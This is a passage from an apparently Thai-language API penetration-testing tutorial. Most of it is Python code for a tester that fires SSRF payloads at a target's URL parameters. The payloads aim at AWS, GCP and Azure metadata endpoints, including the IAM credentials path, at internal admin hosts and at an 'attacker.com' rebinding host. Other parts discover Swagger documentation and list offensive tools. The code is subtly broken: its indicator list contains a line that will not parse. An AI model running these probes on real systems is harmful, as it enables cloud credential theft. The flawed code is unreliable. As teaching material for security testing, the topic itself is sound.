        Test SSRF in API parameters that accept URLs
        """
        ssrf_payloads = [
            # AWS IMDS
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            # GCP metadata
            "http://metadata.google.internal/computeMetadata/v1/",
            # Azure IMDS
            "http://169.254.169.254/metadata/instance",
            # Internal services
            "http://localhost:8080/",
            "http://127.0.0.1/admin",
            "http://internal-service.local/api",
            # DNS rebinding
            "http://ssrf.attacker.com/",  # Resolves to 127.0.0.1
        ]
        
        findings = []
        
        for endpoint in ssrf_endpoints:
            url = f"{self.target}{endpoint}"
            for payload in ssrf_payloads:
                try:
                    # Different parameter names to try
                    for param in ['url', 'webhook', 'callback', 'redirect', 'target', 'dest', 'link']:
                        response = requests.post(
                            url,
                            json={param: payload},
                            timeout=10
                        )
                        
                        # Check for SSRF indicators
                        resp_text = response.text
                        ssrf_indicators = [
                            "ami-id", "instance-id",  # AWS
                            "computeMetadata",  # GCP
                            "location": "westus",  # Azure
                            "root:x:0:0"  # /etc/passwd
                        ]
                        
                        for indicator in ssrf_indicators:
                            if isinstance(indicator, str) and indicator in resp_text:
                                findings.append({
                                    "endpoint": url,
                                    "parameter": param,
                                    "payload": payload,
                                    "indicator": indicator,
                                    "severity": "CRITICAL"
                                })
                                break
                except Exception:
                    pass
        
        return findings
    
    def generate_api_security_report(self, findings: List[Dict]) -> Dict:
        """Generate comprehensive API security report"""
        critical = [f for f in findings if f.get('severity') == 'CRITICAL']
        high = [f for f in findings if f.get('severity') == 'HIGH']
        
        return {
            "summary": {
                "total_findings": len(findings),
                "critical": len(critical),
                "high": len(high),
                "medium": len([f for f in findings if f.get('severity') == 'MEDIUM'])
            },
            "critical_findings": critical,
            "recommendations": [
                "Implement BOLA checks on all resource access",
                "Use short-lived JWTs with refresh token rotation",
                "Enable strict CORS policies with origin whitelist",
                "Rate limit all authentication endpoints",
                "Validate and sanitize all user-supplied data",
                "Block SSRF by validating URLs against allowlist",
                "Disable introspection in production GraphQL",
                "Remove old API versions or redirect to latest",
                "Use HTTPS exclusively, enforce HSTS"
            ]
        }


class APIDocumentationAnalyzer:
    """Analyze API documentation for security issues"""
    
    def find_swagger_endpoints(self, base_url: str) -> List[str]:
        """Find Swagger/OpenAPI documentation"""
        swagger_paths = [
            "/swagger.json", "/swagger.yaml",
            "/api/swagger.json", "/api-docs",
            "/v1/swagger.json", "/v2/api-docs",
            "/openapi.json", "/openapi.yaml",
            "/docs", "/api/docs",
            "/.well-known/openapi.json"
        ]
        
        found = []
        for path in swagger_paths:
            url = f"{base_url}{path}"
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    # Check if it's actually Swagger/OpenAPI
                    try:
                        data = response.json()
                        if 'swagger' in data or 'openapi' in data or 'paths' in data:
                            found.append(url)
                    except Exception:
                        if "swagger" in response.text.lower():
                            found.append(url)
            except requests.RequestException:
                pass
        
        return found
    
    def extract_endpoints_from_swagger(self, swagger_url: str) -> List[Dict]:
        """Extract all endpoints from Swagger spec"""
        try:
            response = requests.get(swagger_url, timeout=10)
            if response.status_code != 200:
                return []
            
            spec = response.json()
            endpoints = []
            
            base_path = spec.get('basePath', '')
            paths = spec.get('paths', {})
            
            for path, methods in paths.items():
                for method, details in methods.items():
                    if method.lower() in ['get', 'post', 'put', 'delete', 'patch']:
                        endpoints.append({
                            'path': base_path + path,
                            'method': method.upper(),
                            'summary': details.get('summary', ''),
                            'security': details.get('security', []),
                            'parameters': [p.get('name') for p in details.get('parameters', [])]
                        })
            
            return endpoints
        except Exception as e:
            return [{"error": str(e)}]


if __name__ == '__main__':
    tester = AdvancedAPITester("https://api.target.com")
    analyzer = APIDocumentationAnalyzer()
    
    print("Advanced API Security Testing")
    
    print("\nWebSocket Testing:")
    print(tester.test_websocket_injection()[:300])
    
    print("\nSSRF Payloads for API Parameters:")
    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://127.0.0.1:8080/admin"
    ]
    for p in ssrf_payloads:
        print(f"  {p}")
    
    print("\nSwagger/OpenAPI Discovery Paths:")
    for path in analyzer.find_swagger_endpoints.__doc__.split()[:5]:  # Just show method exists
        pass
    print("  /swagger.json, /api-docs, /openapi.json, /v2/api-docs")
    
    print("\nTools for API Testing:")
    tools = {
        "Postman": "GUI API client with collection runner",
        "Burp Suite": "Intercept and modify API requests",
        "OWASP ZAP": "API scanning with OpenAPI support",
        "Arjun": "HTTP parameter discovery tool",
        "kiterunner": "API endpoint brute forcing",
        "jwt_tool": "JWT security testing",
        "graphw00f": "GraphQL fingerprinting and testing",
        "ffuf": "Fast web fuzzer for API endpoints"
    }
    for tool, desc in tools.items():
        print(f"  {tool}: {desc}")
```

---

## สรุป Part 67

ในส่วนนี้เราได้เรียนรู้:
- **OWASP API Top 10**: BOLA, Broken Auth, Excessive Data, Missing Rate Limit
- **REST Fuzzing**: Path parameters, headers, JSON body fuzzing
- **GraphQL Testing**: Introspection, batch queries, deep nesting DoS, injection
- **API Auth Testing**: Token reuse, privilege escalation, mass assignment
- **CORS Testing**: Origin reflection, credentials with wildcard
- **WebSocket Security**: Message injection, IDOR via WS
- **Rate Limiting Bypass**: X-Forwarded-For rotation, username variations
- **SSRF via API**: Cloud IMDS access, internal service enumeration
- **API Documentation**: Swagger/OpenAPI discovery and endpoint extraction
- **Tools**: Postman, Burp Suite, jwt_tool, graphw00f, kiterunner
